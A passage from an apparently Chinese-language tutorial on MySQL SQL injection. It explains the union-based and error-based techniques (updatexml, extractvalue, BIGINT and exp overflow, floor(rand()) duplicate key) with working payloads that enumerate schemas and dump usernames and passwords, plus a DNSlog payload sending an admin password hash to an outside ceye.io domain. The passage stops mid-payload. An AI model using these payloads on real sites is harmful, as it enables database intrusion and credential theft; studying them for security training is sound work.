id="isnull-exp"><a href="#isnull-exp" class="headerlink" title="isnull(exp)"></a>isnull(exp)</h5><p>如果exp为null返回1，否侧返回0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select isnull(<span class="number">1</span>+<span class="number">1</span>);</span><br><span class="line">+-------------+</span><br><span class="line">| isnull(<span class="number">1</span>+<span class="number">1</span>) |</span><br><span class="line">+-------------+</span><br><span class="line">|           <span class="number">0</span> |</span><br><span class="line">+-------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select isnull(<span class="number">0</span>);</span><br><span class="line">+-----------+</span><br><span class="line">| isnull(<span class="number">0</span>) |</span><br><span class="line">+-----------+</span><br><span class="line">|         <span class="number">0</span> |</span><br><span class="line">+-----------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>可以配合注入来判断文件是否存在以及是否有权限读取文件。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> math where id=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,concat(<span class="number">0x7e</span>,isnull(LOAD_FILE(<span class="string">&#x27;/Users/apple/Desktop/2.txt&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~1~&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="ifnull-expr1-expr2"><a href="#ifnull-expr1-expr2" class="headerlink" title="ifnull(expr1,expr2)"></a>ifnull(expr1,expr2)</h5><p>假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串。</p><h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><p>延时n秒，执行之后返回0。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(2);</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| sleep(2) |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">|        0 |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">2.00</span> sec)</span><br></pre></td></tr></table></figure><h5 id="exists"><a href="#exists" class="headerlink" title="exists()"></a>exists()</h5><p>exists子句返回的结果并不是从数据库中取出的结果集，而是一个布尔值，如果子句查询到数据，那么返回true，反之返回false。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exists(select * from math);</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">| exists(<span class="keyword">select</span> * <span class="keyword">from</span> math) |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line">|                          <span class="number">1</span> |</span><br><span class="line">+<span class="comment">----------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h4 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h4><h5 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h5><p>二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</p><ul><li><p>按位或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>|<span class="number">9879</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>|<span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line">|   <span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>按位异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>^<span class="number">9879</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>^<span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line">|   <span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>按位与</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>&amp;<span class="number">5464</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>&amp;<span class="number">5464</span> |</span><br><span class="line">+--------+</span><br><span class="line">|      <span class="number">0</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li></ul><p>0与任何的数字A按位或、异或都是A数字。</p><p>0与任何数字按位与都是0。</p><p>逻辑运算符</p><p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。</p><ul><li><p>与运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span>;</span><br><span class="line">+---------+</span><br><span class="line">| <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> |</span><br><span class="line">+---------+</span><br><span class="line">|       <span class="number">0</span> |</span><br><span class="line">+---------+    </span><br><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>;   </span><br><span class="line">+---------+     </span><br><span class="line">| <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> |      </span><br><span class="line">+---------+      </span><br><span class="line">|       <span class="number">1</span> |      </span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure></li><li><p>或运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">or</span> <span class="number">0</span>;</span><br><span class="line">  +--------+</span><br><span class="line">  | <span class="number">2</span> <span class="keyword">or</span> <span class="number">0</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  |      <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  </span><br><span class="line">  mysql&gt; select <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span>;</span><br><span class="line">  +--------+</span><br><span class="line">  | <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  |      <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br></pre></td></tr></table></figure></li><li><p>非运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="keyword">not</span> <span class="number">1</span>;</span><br><span class="line">  +-------+</span><br><span class="line">  | <span class="keyword">not</span> <span class="number">1</span> |</span><br><span class="line">  +-------+</span><br><span class="line">  |     <span class="number">0</span> |</span><br><span class="line">  +-------+</span><br><span class="line">  </span><br><span class="line">  mysql&gt; select !<span class="number">0</span>;</span><br><span class="line">  +----+</span><br><span class="line">  | !<span class="number">0</span> |</span><br><span class="line">  +----+</span><br><span class="line">  |  <span class="number">1</span> |</span><br><span class="line">  +----+</span><br></pre></td></tr></table></figure></li></ul><h4 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h4><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>原理：</p><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为<code>union</code>或<code>union all</code>。</p><p>条件：</p><p>页面有回显、有占位符</p><p>占位符：</p><p>从数据库中取出某些输入能够显示到页面上的某一个位置。</p><p>步骤：</p><ul><li><p>判断是否有注入</p></li><li><p>判断是数字型注入还是字符型注入</p></li><li><p>猜测查询列数</p><p>列数小,正常回显,num大,不回显。</p></li><li><p>寻找占位</p></li><li><p>获取所有数据库名</p></li><li><p>获取指定数据的所有表名</p></li><li><p>获取指定数据库的指定数据表的所有字段名</p></li><li><p>获取指定数据库的指定数据表的所有的内容</p></li></ul><h6 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h6><p>判断字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断显示位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断数据库banner信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select version(),database()#</span></span><br></pre></td></tr></table></figure><p>判断数据库名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata–+</span><br></pre></td></tr></table></figure><p>判断数据库中的表名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>判断数据库中的表的列的名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;users&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>判断字段内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br></pre></td></tr></table></figure><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><ul><li><p>BIGINT等数据类型溢出</p><ul><li><p>原理：</p><ul><li><p>在mysql5.5之前，整形溢出是不会报错的，只有版本号大于5.5.5时，才会报错。</p><p>在mysql中要想获取BIGINT最大值，可以直接0按位置取反,超出最大值就会报错，而sql语句在执行成功的时候会返回0，取反之后就会变成1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>超出最大值就会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(~(0) + 1)&#39;</span><br></pre></td></tr></table></figure></li><li><p>SQL注入利用</p><p>组合好逐位取反和逻辑取反运算，我们就能利用溢出错误来成功的注入查询。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0+!(select*from(select user())x);</span><br><span class="line">ERROR 1690 (22003): BIGINT value is out of range in &#39;(~(0) + (not((select &#39;root@localhost&#39; from dual))))&#39;</span><br></pre></td></tr></table></figure><p>返回0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from(select user())x</span><br></pre></td></tr></table></figure><p>返回1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(select*from(select user())x);</span><br></pre></td></tr></table></figure><p>溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~0+!(select*from(select user())x);</span><br></pre></td></tr></table></figure><p>同理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(select*from(select user())x)-~0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username, password from users where id&#x3D;&#39;1&#39; or !(select*from(select user())x)-~0;</span><br></pre></td></tr></table></figure></li></ul><p>注意：</p><p>当MySQL版本大于或等于5.5.53时，数据溢出注入无效。</p></li><li><p>exp()函数：当传入的数值大于709的时候就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</span><br></pre></td></tr></table></figure></li><li><p>exp函数与整形溢出结合</p><ul><li><p>mysql&gt;5.5.53时，则不能返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.7.26    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(~(select * from (select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#96;x&#96;.&#96;user()&#96; from (select user() AS &#96;user()&#96;) &#96;x&#96;)))&#39;</span><br></pre></td></tr></table></figure></li><li><p>mysql5.5.47可以在报错中返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#96;a&#96;.&#96;x&#96;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>xpath语法错误</p><ul><li><p>原理：</p><p>mysql&gt;5.1.5，提供两个函数来修改和查询XML，updatexml用来修改文档，extractvalue用来按照xpath语法查询节点内容。</p><ul><li><p>updatexml()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XMLdocument, XPathstring, new_value);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure><p>UPDATEXML第二个参数需要Xpath格式的字符串，如果不符合就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26~&#39;</span><br></pre></td></tr></table></figure></li><li><p>extractvalue()对XML文档进行查询的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br><span class="line">第一个参数：可以传入目标xml文档</span><br><span class="line">第二个参数：用Xpath路径法表示的查找路径</span><br></pre></td></tr></table></figure><p>寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT extractvalue(&#39;22&#39;,concat(&#39;~&#39;,(select version())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>主键重复</p><ul><li><p>基本函数</p><ul><li><p>rand()</p><p>rand()随机产生一个0～1的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand();</span><br><span class="line">+----------------------+</span><br><span class="line">| rand()               |</span><br><span class="line">+----------------------+</span><br><span class="line">| 0.006128073675677249 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand();</span><br><span class="line">+---------------------+</span><br><span class="line">| rand()              |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.33123136435750067 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>rand(0)产生一个固定的0～1的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(0);</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0);</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>有几条数据就会返回几条随机数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand() from math;</span><br><span class="line">+----------------------+</span><br><span class="line">| rand()               |</span><br><span class="line">+----------------------+</span><br><span class="line">|   0.6377726314941167 |</span><br><span class="line">|   0.1951690951317261 |</span><br><span class="line">|  0.06252761190992558 |</span><br><span class="line">|   0.7271308048880946 |</span><br><span class="line">|  0.44807121944434125 |</span><br><span class="line">| 0.058963713291067366 |</span><br><span class="line">|   0.9506049388559581 |</span><br><span class="line">+----------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select *  from math;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">|    3 | chengxian |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">+------+-----------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>floor()该函数返回X的最大整数值，但不能大于X</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(5.23);</span><br><span class="line">+-------------+</span><br><span class="line">| floor(5.23) |</span><br><span class="line">+-------------+</span><br><span class="line">|           5 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>floor() 返回小于等于该值的最大整数,rand返回0到1.乘2自然返回0到2,加上floor自然返回0到1.所以我们基本确认要么返回0要么返回1。</p><p><code>floor(rand(0)*2)</code>:具有确定性</p><p><code>floor(rand()*2)</code>:具有不确定性</p></li></ul></li><li><p>原理：</p><p>count()和group by在遇到rand()产生的重复值时报错。</p><p><code>Select name,count(*)  from student group by name</code>    </p><p>这条语句的作用就是从<code>student</code>表中<code>select</code>出<code>name</code>和<code>count</code>(count会具体返回一个数字).这个数字的多少就是根据<code>grop by</code> 后面的<code>name</code>来决定。也就是说最终他会返回姓名以及每一个姓名出现的次数。</p><p>重点是这语句具体是怎么执行的？是如何计算出我们查询的不同字段(name)的个数的？</p><p>发现mysql遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 <code>key</code> ，一个是计数值 <code>count(*)</code></p><p><strong>在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加1，不存在则新建该分组</strong></p><p>同理我们根据<code>floor(rand(0)*2)</code>进行分组—–这里要注意<code>floor(rand(0)*2)</code>执行之后是有规律的返回0或者1。</p><p>根据之前rand的顺序—011011011,我们来梳理一下为什么会报错</p><ul><li><p>第一次计算执行一次产生0,表中不存在任何数据,然后开始插入</p></li><li><p>插入的时候会进行第二次计算,所以在执行一次产生1插入</p></li><li><p>第三次计算产生1因为第二次产生了1所以本次就无需在执行一次计算,直接在原来的基础上加1就可以,不会在进行一次计算</p></li><li><p>第四次产生0,原来的表中没有0所以要进行插入操作,会再一次计算产生1.所以会再次产生一个分组,<strong>注意是产生一个分组,不是单纯的产生一个数值</strong></p><p>此时此刻就报错了。因为我们已经有了一个1分组了。注意是有了一个1分组了。在添加一个1分组会报错。</p></li></ul><p>注意：</p><p>sql语句在执行之后建立虚表分两种情况：</p><p>1、表中没有对应的列，执行一次查询，一次插入，<code>floor(rand(0)*2)</code>会被执行两次。</p><p>2、表中有对应的列，执行一次查询，一次插入，<code>floor(rand(0)*2)</code>只会被执行一次。</p><p>主键重复的最少前提就是虚拟表中要有三条数据才会产生重复,也就是group by执行至少三次,也就是对应的group by的表要有至少三条数据</p></li></ul></li><li><p>几何函数</p><p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()等函数</p><p>这些函数报错原理大多都相同，都是不满足参数需求而导致的报错。</p></li><li><p>DNSlog外带配合报错注入</p><p>作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。用ceye.io这个平台，这个平台就集成了Dnslog的功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;mysql.php?id&#x3D;1 union select 1,2,load_file(CONCAT(&#39;\\&#39;,(SELECT hex(pass) </span><br><span class="line">FROM test.test_user WHERE name&#x3D;&#39;admin&#39; LIMIT 1),&#39;.mysql.steady.ceye.io\abc&#39;))</span><br></pre></td></tr></table></figure><p>load_file函数在Linux下是无法用来做dnslog攻击的。</p><p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><p>\sss.xxx\test\</p><p>这也就解释了为什么CONCAT()函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用UNC路径。</p><p>tips：</p><p>因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</span><br></pre></td></tr></table></figure></li></ul><h6 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;  and extractvalue(1,concat(0x7e,user(),0x7e))<span class="comment">#</span></span><br><span class="line">-1&#x27;  and 